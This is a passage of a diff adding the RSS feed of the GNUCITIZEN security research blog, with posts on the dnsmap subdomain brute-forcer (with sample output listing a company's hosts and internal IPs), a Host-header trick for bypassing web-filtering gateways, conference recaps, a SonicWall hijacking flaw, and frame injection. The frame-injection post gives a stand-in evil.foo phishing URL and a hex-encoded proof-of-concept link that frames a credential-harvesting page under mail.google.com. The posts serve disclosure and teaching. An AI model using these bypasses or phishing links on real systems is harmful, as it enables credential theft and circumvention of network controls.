+<li>obtain all IP addresses (A records) associated to each successfully bruteforced subdomain, rather than just one IP address per subdomain</li>
+<li>abort the bruteforcing process in case the target domain uses wildcards</li>
+<li>ability to be able to run the tool without providing a wordlist by using a built-in list of keywords</li>
+<li>bruteforcing by using a user-supplied wordlist (as opposed to the built-in wordlist)</li>
+</ul>
+
+<h3>New Improvements in Version 0.22</h3>
+
+<ul>
+<li>saving the results in human-readable and CSV format for easy processing</li>
+<li>fixed bug that disallowed reading wordlists with DOS CRLF format</li>
+<li>improved built-in subdomains wordlist</li>
+<li>new bash script (<code>dnsmap-bulk.sh</code>) included which allows running dnsmap against a list of domains from a user-supplied file. i.e.: bruteforcing several domains in a bulk fashion</li>
+<li>bypassing of signature-based <a href="https://lists.dns-oarc.net/pipermail/dns-operations/2006-September/001047.html">dnsmap detection</a> by generating a proper pseudo-random subdomain when checking for wildcards</li>
+</ul>
+
+<h3>Usage</h3>
+
+<pre><code>
+usage: dnsmap &lt;target-domain&gt; [options]
+options:
+-w &lt;wordlist-file&gt;
+-r &lt;results-path&gt;
+</code></pre>
+
+<h3>Example on Live Domain</h3>
+
+<p>The following is just an example so you get an idea of how dnsmap works. Very simple to use as you can see. If you want to save the results or use your own wordlist, checkout the usage syntax. Question for those who pay attention to detail: <em>can you spot the potential leaks of <a href="http://www.faqs.org/rfcs/rfc1918.html">internal IP addresses</a>?</em></p>
+<pre><code>
+$ dnsmap baidu.com
+dnsmap 0.22 - DNS Network Mapper by pagvac (gnucitizen.org)
+
+[+] searching (sub)domains for baidu.com using built-in wordlist
+
+accounts.baidu.com
+IP address #1: 10.11.252.74
+
+events.baidu.com
+IP address #1: 202.108.23.40
+
+finance.baidu.com
+IP address #1: 60.28.250.196
+IP address #2: 60.28.251.79
+IP address #3: 60.28.251.206
+IP address #4: 123.129.240.28
+IP address #5: 123.129.240.29
+IP address #6: 60.28.250.102
+IP address #7: 60.28.250.111
+
+forum.baidu.com
+IP address #1: 202.108.250.212
+
+images.baidu.com
+IP address #1: 61.135.163.93
+
+mail.baidu.com
+IP address #1: 10.23.3.137
+
+mobile.baidu.com
+IP address #1: 202.108.23.125
+
+mx.baidu.com
+IP address #1: 61.135.163.61
+
+mx1.baidu.com
+IP address #1: 61.135.163.61
+
+mx2.baidu.com
+IP address #1: 61.135.163.62
+
+mx3.baidu.com
+IP address #1: 61.135.162.61
+
+news.baidu.com
+IP address #1: 61.135.163.87
+
+ns1.baidu.com
+IP address #1: 202.108.22.220
+
+ns2.baidu.com
+IP address #1: 61.135.165.235
+
+ns3.baidu.com
+IP address #1: 220.181.37.10
+
+oracle.baidu.com
+IP address #1: 172.18.0.50
+
+photo.baidu.com
+IP address #1: 61.135.163.93
+
+photos.baidu.com
+IP address #1: 61.135.163.93
+
+pop.baidu.com
+IP address #1: 61.135.166.249
+
+proxy.baidu.com
+IP address #1: 202.108.11.30
+
+smtp.baidu.com
+IP address #1: 61.135.163.61
+
+vpn.baidu.com
+IP address #1: 202.108.250.231
+
+wap.baidu.com
+IP address #1: 61.135.163.237
+
+webmail.baidu.com
+IP address #1: 61.135.166.249
+
+win.baidu.com
+IP address #1: 10.65.19.212
+
+www.baidu.com
+IP address #1: 220.181.5.222
+
+www1.baidu.com
+IP address #1: 220.181.5.222
+
+www2.baidu.com
+IP address #1: 202.108.22.136
+
+www3.baidu.com
+IP address #1: 202.108.22.188
+
+[+] 29 (sub)domains and 35 IP address(es) found
+</code></pre><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/new-version-of-dnsmap-out/feed/</wfw:commentRss>
+		<slash:comments>20</slash:comments>
+		</item>
+		<item>
+		<title>Messing with Web Filtering Gateways</title>
+		<link>http://www.gnucitizen.org/blog/messing-with-web-filtering-gateways/</link>
+		<comments>http://www.gnucitizen.org/blog/messing-with-web-filtering-gateways/#comments</comments>
+		<pubDate>Wed, 14 Jan 2009 17:49:26 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[bypass]]></category>
+		<category><![CDATA[filtering]]></category>
+		<category><![CDATA[mimesweeper]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=2003</guid>
+		<description><![CDATA[Most of us are familiar with several techniques that allow us to bypass web filtering gateways like CS MIMESweeper.
+
+The following are some of them:
+
+
+access the desired site via IP address rather than domain name
+access cached content rather than live data. i.e.: using Google&#8217;s cache: command
+using proxies. i.e.: anonymouse, Google translator, etc
+using alternative connections. [...]]]></description>
+			<content:encoded><![CDATA[<p>Most of us are familiar with several techniques that allow us to bypass web filtering gateways like <a href="http://www.clearswift.com/products/msw/web_appliance/default.aspx">CS MIMESweeper</a>.</p>
+
+<p>The following are some of them:</p>
+
+<ol>
+<li>access the desired site via IP address rather than domain name</li>
+<li>access cached content rather than live data. i.e.: using Google&#8217;s <code><a href="http://216.239.59.132/search?hl=en&amp;q=cache%3Awww.gnucitizen.org%2Fabout%2F&amp;btnG=Google+Search&amp;meta=">cache:</a></code> command</li>
+<li>using proxies. i.e.: anonymouse, Google translator, etc</li>
+<li>using alternative connections. i.e.: connecting your laptop online via your mobile/cell phone&#8217;s <a href="http://en.wikipedia.org/wiki/High-Speed_Downlink_Packet_Access">HSDPA</a> interface</li>
+</ol>
+
+<p>Each method has different advantages and disadvantages. For instance, method #1 only works on servers that do NOT use domain-based virtual hosts, i.e.: shared hosting. The exception to this rule is that the site served by default when requesting the IP-based URL (rather than domain-based), is the one you&#8217;re after. You&#8217;ll have to use your judgment when deciding which technique is the right one for you.</p>
+
+<p>Whatever the reason may be, there are many legitimate reasons for accessing websites that are blocked by the gateway in question. Personally, when I&#8217;m doing on-site pentests, I sometimes need to access useful online resources, which unfortunately are often flagged under the <q>hacking</q> category.</p>
+
+<h3>Another nifty trick</h3>
+
+<p>There is perhaps a lesser known technique which although does not work against all appliances, it does work even in cases where the web server you want to connect to uses domain-based virtual hosts. I&#8217;ve personally seen work on a Clearswift MIMEsweeper environment. <em>Note that it might not work against the latest versions, so please keep this in mind if you can&#8217;t replicate this technique!</em></p>
+
+<p>The idea is to sneak the domain name matching the server&#8217;s virtual host, while being able to bypass the content filter. As you know, filtering gateways block bad websites based on domain names. For instance, an HTTP request would be inspected to make sure that the requested URL doesn&#8217;t contain a black-listed domain name.</p>
+
+<p>Not too long ago I tested a MIMEsweeper appliance and noticed that HTTP requests were only inspected for bad domain names within the URL data, but not within the <code>Host:</code> header, i.e.:</p>
+
+<pre><code>GET http://1.2.3.4/ HTTP/1.1
+Host: www.blockedsite.foo
+[some headers removed for clarity purposes]</code></pre>
+
+<p>The previous HTTP request would bypass MIMEsweeper&#8217;s filter (not sure if it works on all versions) even if www.blockedsite.foo was a black-listed domain. Reason for that is because only the <code>http://</code> URL is being inspected. The remote server would still happily return the website we&#8217;re interested in as we have successfully established a TCP connection, and the desired virtual host has been requested.</p>
+
+<p>I put the following steps together to test this technique using Firefox&#8217;s <a href="https://addons.mozilla.org/en-US/firefox/addon/967">Modify Headers</a> extension. Please see the attached screenshots for more details:</p>
+
+<ol>
+<li>Get the target site&#8217;s IP address by using a command line tool such as ping or host, or public websites such as domaintools.com</li>
+<li>Fire up Modify Headers</li>
+<li>Add a new modify rule (top-left drop-down menu) and enter <code>Host</code> as a name, and the domain name of the site you want to visit as value</li>
+<li>Double-click on the new rule so that the red light becomes green (rule is now active)</li>
+<li>If the technique worked against your appliance, you should now be able to freely browse the blocked site by entering its corresponding IP address in your browser&#8217;s address bar</li>
+</ol>
+
+<p><em>And this is one of the many techniques to bypass web filtering gateways.</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/messing-with-web-filtering-gateways/feed/</wfw:commentRss>
+		<slash:comments>8</slash:comments>
+		</item>
+		<item>
+		<title>Back from the cons!</title>
+		<link>http://www.gnucitizen.org/blog/back-from-the-cons/</link>
+		<comments>http://www.gnucitizen.org/blog/back-from-the-cons/#comments</comments>
+		<pubDate>Mon, 10 Nov 2008 10:05:21 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[embedded devices]]></category>
+		<category><![CDATA[hack.lu]]></category>
+		<category><![CDATA[hijack]]></category>
+		<category><![CDATA[hitb]]></category>
+		<category><![CDATA[hitbsecconf]]></category>
+		<category><![CDATA[mitm]]></category>
+		<category><![CDATA[sonicwall]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=1715</guid>
+		<description><![CDATA[It&#8217;s been a crazy month, so much going on! I had the pleasure of presenting my updated Cracking into embedded devices presentation at Hack.lu (Luxembourg) and Hack in the Box (Malaysia). I also had to give a talk on PCI DSS in London, which was a challenge as PCI DSS is not the most fun topic for me, trust me!
+
+The best thing about assisting these kind of events is the technical discussions and exchange of ideas with not just other presenters but also attendees. [...]]]></description>
+			<content:encoded><![CDATA[<p>It&#8217;s been a crazy month, so much going on! I had the pleasure of presenting my updated <a href="http://sites.google.com/a/gnucitizen.org/lab/presentations">Cracking into embedded devices</a> presentation at <a href="http://wiki.hack.lu/">Hack.lu</a> (Luxembourg) and <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/">Hack in the Box</a> (Malaysia). I also had to give a talk on PCI DSS in London, which was a challenge as PCI DSS is not the most fun topic for me, trust me!</p>
+
+<p>The best thing about assisting these kind of events is the technical discussions and exchange of ideas with not just other presenters but also attendees. It&#8217;s amazing the quality of talent you find at hacker/security conferences which always remind us that there is always someone out there who knows more than we do.</p>
+
+<h3>New SonicWALL Vulnerability</h3>
+
+<p>At HITB, I released the details of the <a href="http://www.gnucitizen.org/blog/new-technique-to-perform-universal-website-hijacking/">universal website hijacking vulnerability</a> which affects most (perhaps all?) SonicWall firewalls running firmware <code>SonicOS Enhanced &lt;4.0.1.1</code>. In short, if you have a SonicWall appliance running firmware older than <code>4.0.1.1</code>, <em>any website that you&#8217;re browsing can be hijacked</em> by third-party sites while you&#8217;re browsing the web. Think of the contents of your Gmail inbox or address book being sent somewhere else while you&#8217;re browsing the web.</p>
+
+<p>It turns out that this technique is not brand new as I thought. Somehow, I couldn&#8217;t find earlier examples of this technique. So while this type of vulnerability is not that popular, there was a <a href="http://lists.virus.org/sec-adv-0305/msg00106.html">similar example</a> published five years ago. Funny enough, I used to follow infohacking.com&#8217;s (site not up anymore) research, but couldn&#8217;t remember their Microsoft ISA finding. In their original advisory, they referred to the finding as a MiTM XSS. If you go through my <a href="http://lab.gnucitizen.org/research-papers">Universal Website Hijacking by Exploiting Firewall Content Filtering Features</a> paper, you&#8217;ll understand why.</p>
+
+<p>From the paper:</p>
+
+<blockquote>The technique discussed in this paper demonstrates how any website can be hijacked without relying on a cross-domain vulnerability present on the targeted site or client-side software present on the victim&#8217;s computer. Instead, the attacker exploits a vulnerability on the firewall/proxy appliance in charge of &#8220;protecting&#8221; the victim user. Furthermore, the cross-domain vulnerability discussed in this paper is of universal nature, which means that any website can be hijacked as long as the victim user&#8217;s connection is &#8220;protected&#8221; by a firewall appliance of the affected vendor in question.</blockquote>
+
+<h3>Fave presentations</h3>
+
+<p>I must admit I couldn&#8217;t see all presentations at Hack.lu and Hack in the Box. However, from what I saw, my favorites at Hack.lu were the <a href="http://wiki.hack.lu/index.php/List#Philippe_Langlois">SS7 talk</a> by Philippe Langlois and <a href="http://wiki.hack.lu/index.php/List#Saumil_Shah">Browser Exploits</a> by Saumil Shah. While at HITB, the <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/?page_id=199">Pirate Bay</a> talk by its very founders, and <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/?page_id=215">How to Build Your Own Password Cracker with a Disassembler and a Little VM Magic</a> by Matthew Geiger were some of the best in my opinion.</p>
+
+<p>Philippe Langlois discussed the evolution of phreaking and argued that manipulating <a href="http://www.tech-faq.com/ss7.shtml">SS7</a> and SS7 over IP (SIGTRAN) are the closest thing to the blue box we have in modern telephone networks. No matter what telephony technology we use, SS7 is always functioning behind the scenes in the backbone of the PSTN. SS7 is in charge of very-interesting functionalities such as routing, sms and even billing. Therefore, learning how to manipulate the SS7 protocol suite is essential for telephone hackers.</p>
+
+<p>Saumil Shah talked about the current landscape of browser exploitations, and how despite new browser techniques by Sotirov , heap spray exploitation still works like a charm and isn&#8217;t stopped by protections such as ASLR, DEP, NX, GS, etc &#8230;</p>
+
+<p>As for the Pirate Bay guys, well, awesome and very entertaining presentation. I recommend watching the video which is <a href="http://www.idg.se/2.1085/1.188905">online</a>. It&#8217;s amazing the number of stories these guys have to tell, regarding media companies trying to stop them. These includes all sorts of dirty tricks including DDoSing their infrastructure.</p>
+
+<p>Matthew Geiger talked about several aspects of the computer forensics field, including restrictions that the law imposes on forensics professionals that make their work even harder. However, it was his demo which I liked the best (I love demos). He showed how to make a homegrown password cracker for the TrueCrypt boot loader password prompt. In short, he virtualized the disk using Live View, and patched the TrueCrypt binary in charge of asking for the boot password using IDA Pro. Finally redirected a wordlist with all passwords to try to the patched binary. The patch is only a change in one byte of the binary which allows us to try as many passwords as we need, rather than a maximum of three. The patch allows us to never increase the counter in charge of tracking how many password have been attempted by inserting a NOP (0&#215;90).</p>
+
+<p>Finally, I was a bit disappointed by Kris Kaspersky&#8217;s presentation on remote code execution by exploiting CPU bugs. Although to me this was supposed to be one of the hottest talks, there was no details or demo given as part of the presentation. After talking to a few members of the audience, it seems that I&#8217;m not the only one who was more confused about the topic after the presentation rather than before. Don&#8217;t get me wrong, the topic is <strong>super interesting</strong>, but the presentation was somehow confusing, and the material was hard to understand since no details were given. I think that when a topic that is so rare to most people is presented, giving details and a demonstration is crucial for the audience to grasp the core of the research.</p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/back-from-the-cons/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Frame Injection Fun</title>
+		<link>http://www.gnucitizen.org/blog/frame-injection-fun/</link>
+		<comments>http://www.gnucitizen.org/blog/frame-injection-fun/#comments</comments>
+		<pubDate>Fri, 10 Oct 2008 00:01:28 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[frame injection]]></category>
+		<category><![CDATA[google]]></category>
+		<category><![CDATA[password theft]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[web app]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=1568</guid>
+		<description><![CDATA[Frame injection vulnerabilities, although some people might consider them the same as HTML injection/XSS or even a subset, they really are not the same. Here is why:
+
+
+There is no need to inject special control characters such as angle brackets (unlike HTMLi/XSS)
+HTMLi/XSS filtering routines will not project against frame injection since the attacker only needs to insert a URL in the non-sanitized parameter
+
+
+The best way to explain what I mean is to show an example. [...]]]></description>
+			<content:encoded><![CDATA[<p>Frame injection vulnerabilities, although some people might consider them the same as HTML injection/XSS or even a subset, they really are not the same. Here is why:</p>
+
+<ul>
+<li>There is no need to inject special control characters such as angle brackets (unlike HTMLi/XSS)</li>
+<li>HTMLi/XSS filtering routines will not project against frame injection since the attacker only needs to insert a URL in the non-sanitized parameter</li>
+</ul>
+
+<p>The best way to explain what I mean is to show an example. Most frame injection issues occur in web applications because dynamic <a href="http://www.w3.org/TR/html4/present/frames.html">frameset/iframe</a> insertion is not implemented with enough filtering. For instance, say that we have the following URL on the target site:</p>
+
+<pre><code>https://www.victim.foo/index.php?<strong>targeturl</strong>=/contact.php</code></pre>
+
+<p>A malicious user with intentions of launching a phishing attack will try tampering the <code>targeturl</code> parameter. His goal is to insert a third-party page that is under his control, rather than the original contact page. Indeed, <code>index.php</code>, although is not allowing HTML or JavaScript to be assigned to <code>targeturl</code>, is happy to process an absolute URL rather than a relative one:</p>
+
+<pre><code>https://www.victim.foo/index.php?<strong>targeturl</strong>=http://evil.foo/login.php</code></pre>
+
+<p>I thought that showing a live example would help our readers get an idea of what frame injection looks in action. For that purpose, I prepared a rather not elegant proof of concept which takes advantage of the Google Images service. What&#8217;s neat is that although the legitimate URL would normally use the <code>images.google.com</code> domain, Google also allow us to use other google.com subdomains such as <code>mail.google.com</code> which is used by Gmail. This is ideal, as we&#8217;re trying to accomplish a frame injection attack which can be used to perform phishing attacks against Gmail users.</p>
+
+<pre><code>http://mail.google.com/imgres?imgurl=http://SecureGoogleMail&amp;<strong>imgrefurl</strong>=http://mail.google.com/imgres?imgurl=http://SecureGoogleMail&#038;imgrefurl=%68%74%74%70%3a%2f%2f%73%6e%69%70%75%72%6c%2e%63%6f%6d%2f%67%6e%77%62%6f</code></pre>
+
+<div class="screen"><img src="http://www.gnucitizen.org/static/blog/2008/10/frame-injection-fun-poc-300x210.png" alt="Frame Injection Fun POC" title="Frame Injection Fun POC" width="300" height="210" class="alignnone size-medium wp-image-2366" /></div>
+
+<p>The previous PoC URL will cause the entered credentials to be submitted to www.gnucitizen.org when clicking on Sign in, so please do NOT submit any real credentials!</p>
+
+<blockquote>pIn short:p The attacker has managed to display a non-legitimate third-party page, while the legitimate domain (mail.google.com in this case) is shown in the address bar.The beauty of frame injection attacks is that the attacker is able to impersonate a trusted entity without needing to bypass XSS/HTMLi filters or even break into the target server.</blockquote>
+
+<p><em>Needless to say, in real-life the attacker would most likely automate the process of obtaining the harvested credentials by using a tool such as our <a href="http://lab.gnucitizen.org/projects/x-php-data-theft-script">x.php</a> data-theft script.</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/frame-injection-fun/feed/</wfw:commentRss>
+		<slash:comments>31</slash:comments>
+		</item>
+		<item>
+		<title>New technique to perform universal website hijacking</title>
+		<link>http://www.gnucitizen.org/blog/new-technique-to-perform-universal-website-hijacking/</link>
+		<comments>http://www.gnucitizen.org/blog/new-technique-to-perform-universal-website-hijacking/#comments</comments>
+		<pubDate>Sat, 20 Sep 2008 14:56:05 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[0day]]></category>
+		<category><![CDATA[embedded devices]]></category>
+		<category><![CDATA[firewall]]></category>
+		<category><![CDATA[hack in the box]]></category>
+		<category><![CDATA[hitbsecconf]]></category>
+		<category><![CDATA[vulnerability]]></category>
+		<category><![CDATA[zdi]]></category>
+		<category><![CDATA[zero day initiative]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=1347</guid>
+		<description><![CDATA[I&#8217;m really excited that HITBSecConf2008 Malaysia is coming up soon: end of October to be precise. I highly recommend our readers to attend such event, as it&#8217;s organized by one of the finest security event crews I have ever dealt with. There are tons of talks I want to attend, which I will cover in another post. [...]]]></description>
+			<content:encoded><![CDATA[<p>I&#8217;m really excited that <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/">HITBSecConf2008 Malaysia</a> is coming up soon: end of October to be precise. I highly recommend our readers to attend such event, as it&#8217;s organized by one of the finest security event crews I have ever dealt with. There are tons of talks I want to attend, which I will cover in another post. The GNUCITIZEN team would like to thank the Hack in the Box (HITB) staff for inviting us to the Malaysia edition of the conference, making this the second time pdp and I will speak at HITBSecConf. The HITBSecConf crew includes Dhillon, <a href="http://geek00l.blogspot.com/">geek00l</a>, <a href="http://mel.icious.net/">spoonfork</a>, Belinda, Prabu, <a href="http://geeks.serverfreak.biz/rufi0/blog/">ruFI0</a> and Amy among others. Thank you guys, we&#8217;re really humbled by your invitation.</p>
+
+<p>I will be delivering the updated version of my <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/?page_id=186">Cracking into Embedded Devices and Beyond!</a> presentation, which will include a quite special &#8211; i.e.: unusual &#8211; 0day vulnerability which I have successfully reported via <a href="http://www.zerodayinitiative.com/">Zero Day Initiative</a>.</p>
+
+<h3>The 0day vuln</h3>
+<p>Well, I cannot give full details on the vulnerability at this moment, due to ZDI&#8217;s advisory not being published yet. I&#8217;m planning to release the full details for the first time on <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/agenda.htm">30th October</a> at HITBSecConf2008 Malaysia. However, there are a few things I can tell you for the moment being. First of all, the affected system is an embedded device, which is quite obvious by reading the name of my presentation. More precisely, the vulnerability affects appliances of a well-known firewall vendor.</p>
+
+<p>Usually, web cross-domain vulnerabilities, affect either a server-side service/application, or client-side software. For instance, we might have a cross-domain vulnerability on the target site itself (i.e.: XSS/HTML injection), or on a client-side component present on the victim&#8217;s user component. i.e.: web browser itself or web browser plugin. In the case of my finding however, the targeted website can still be hijacked even if the site is NOT vulnerable to XSS, and even if the client-side software on the victim&#8217;s computer is not vulnerable to any cross-domain vulnerability.</p>
+
+<p>In this case, the attacker exploits a vulnerability which doesn&#8217;t affect the targeted website, nor the software installed on the victim user&#8217;s computer. Instead, the attacker exploits a vulnerability on the firewall appliance in charge of <q>protecting</q> the corporate user. Additionally, the cross-domain vulnerability is of <i>universal</i> nature, which means that any website can be hijacked as long as the victim user&#8217;s connection is <q>protected</q> by a firewall appliance of the affected vendor in question.</p>
+
+<p>In summary, by exploiting this vulnerability the attacker:</p>
+
+<ul>
+<li>can hijack ANY website. i.e.: steal session IDs, inject non-legitimate HTML content, and other evil goodness</li>
+<li>doesn&#8217;t need to find any XSS on the website he/she wants to hijack</li>
+<li>doesn&#8217;t need to find any vulnerability on software present on the victim user&#8217;s computer</li>
+</ul>
+
+<p><em>There is virtually nothing the victim user can do to protect against this attack if his/her connection is &#8220;protected&#8221; by a firewall appliance affected by this vulnerability. There are other factors that make this vulnerability quite special, but as I said, I can&#8217;t give too many details for now. All in all, this finding is a good reminder that our online security not only depends on end-point systems such as the client and server that have established a connection, but also all the hops/devices in between!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/new-technique-to-perform-universal-website-hijacking/feed/</wfw:commentRss>
+		<slash:comments>15</slash:comments>
+		</item>
+		<item>
+		<title>Viva La Defcon!</title>
+		<link>http://www.gnucitizen.org/blog/viva-la-defcon/</link>
+		<comments>http://www.gnucitizen.org/blog/viva-la-defcon/#comments</comments>
+		<pubDate>Wed, 13 Aug 2008 06:19:42 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[captain crunch]]></category>
+		<category><![CDATA[defcon]]></category>
+		<category><![CDATA[ligthman]]></category>
+		<category><![CDATA[vegas]]></category>
+		<category><![CDATA[wargames]]></category>
+
+		<guid isPermaLink="false">http://www.gnucitizen.org/?p=1043</guid>
+		<description><![CDATA[Defcon 16 was awesome! I&#8217;d like to congratulate Dark Tangent and all the Defcon goons for such an awesome event.
+
+
+
+This year somehow I managed to meet more people, attend more parties and see more presentations than during previous years. I had the pleasure to meet other fellow researchers for the first time such as Nathan McFeters, Billy (BK) Rios, RSnake, id and many others! All of them are security warriors whose research I was familiar with, but had never met in person. [...]]]></description>
+			<content:encoded><![CDATA[<p>Defcon 16 was awesome! I&#8217;d like to congratulate Dark Tangent and all the Defcon <a href="https://www.defcon.org/html/links/dc-goons.html">goons</a> for such an awesome event.</p>
+
+<div class="screen"><a href="http://www.gnucitizen.org/static/blog/2008/08/defcon.jpg"><img src="http://www.gnucitizen.org/static/blog/2008/08/defcon-300x225.jpg" alt="" title="defcon" width="300" height="225" class="aligncenter size-medium wp-image-6215" /></a></div>
+
+<p>This year somehow I managed to meet more people, attend more parties and see more presentations than during previous years. I had the pleasure to meet other fellow researchers for the first time such as <a href="http://natemcfeters.blogspot.com/">Nathan McFeters</a>, <a href="http://xs-sniper.com/">Billy (BK) Rios</a>, <a href="http://ha.ckers.org/">RSnake</a>, <a href="http://www.fthe.net/">id</a> and many others! All of them are security warriors whose research I was familiar with, but had never met in person. It&#8217;s always nice to put a face to a name!</p>
+
+<p>Although meeting the aforementioned individuals was of course a pleasure as I enjoyed having a nice chat with all of them, perhaps the most special and unexpected encounter was running into Captain Crunch!</p>
+
+<p>In short, while chilling at the freak show party, I saw an elderly gentleman who appeared to be having a great time at the dance floor. This gentleman called my attention as he appeared to never run out of energy despite his active dancing activity. Eventually, I started noticing his resemblance with <a href="http://www.webcrunchers.com/crunch/origins.html">Captain Crunch</a>. So I told my wife: <em>you know, it&#8217;s funny, but there is this man on the dance floor who looks a lot like a big icon from the early history of hacking: <em>captain crunch</em></em>. My wife was familiar with such legend of the hacker culture thanks to having seen <a href="http://www.moviesfoundonline.com/secret_history_of_hacking.php">The Secret History of Hacking</a> and kind of agreed with me regarding his resemblance with Captain Crunch.</p>
+
+<p>To me it was kind of surreal to find Captain Crunch raving at a Defcon party. Eventually I approached him and said: <em>excuse me, have you ever been told that you look like Captain Crunch?</em>. And he goes like: <q>I am Captain Crunch!</q> Amazing, I guess anything is possible at Defcon!</p>
+
+<p>Also, I got to hangout with several friends including <a href="http://www.gnucitizen.org/author/pdp/">pdp</a> which is great. Regarding presentations, I saw quite a few, some more relevant to my profession as a pentester than others. My favorites were <a href="https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Alonso">Time-Based Blind SQL Injection using heavy queries</a>, <a href="http://www.defcon.org/html/defcon-16/dc-16-speakers.html#Martin">Sniffing Cable Modems</a> and <a href="http://www.defcon.org/html/defcon-16/dc-16-speakers.html#Nycmike">The World of Pager Sniffing</a>. All of them really fun talks!</p>
+
+<p>Finally, I really enjoyed the showing of the original <a href="http://en.wikipedia.org/wiki/WarGames">Wargames</a> movie for its 25th anniversary. Not only is Wargames one of my favorite (and perhaps more accurate) hacker movies, but <a href="http://blog.zerodaydefense.net/">David Scott Lewis</a> &#8211; a.k.a. Lightman &#8211; was there himself to answer questions made by DT and anyone in the audience. For those who don&#8217;t know who David Scott Lewis is, he was the model for Matthew Broderick&#8217;s character in the movie Wargames.</p>
+
+<p><em>PS: excuse my sleepy face in the picture!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/viva-la-defcon/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
